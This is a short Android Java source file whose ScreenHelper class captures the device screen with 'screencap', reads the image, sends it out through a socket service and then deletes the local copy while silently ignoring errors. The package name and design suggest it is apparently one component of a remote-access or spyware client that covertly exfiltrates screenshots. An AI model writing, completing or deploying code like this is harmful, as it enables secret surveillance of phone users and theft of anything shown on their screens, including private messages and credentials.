package com.rainbow.client;

import android.content.Context;
import java.io.File;

public class ScreenHelper {
    public static void capture(Context ctx) {
        try {
            Process p = Runtime.getRuntime().exec("screencap -p /sdcard/sc.png");
            p.waitFor();
            File f = new File("/sdcard/sc.png");
            if (f.exists()) {
                byte[] data = new byte[(int) f.length()];
                java.io.FileInputStream in = new java.io.FileInputStream(f);
                in.read(data); in.close();
                SocketService2.sendFile("screen.png", data);
                f.delete();
            }
        } catch (Exception ignored) {}
    }
}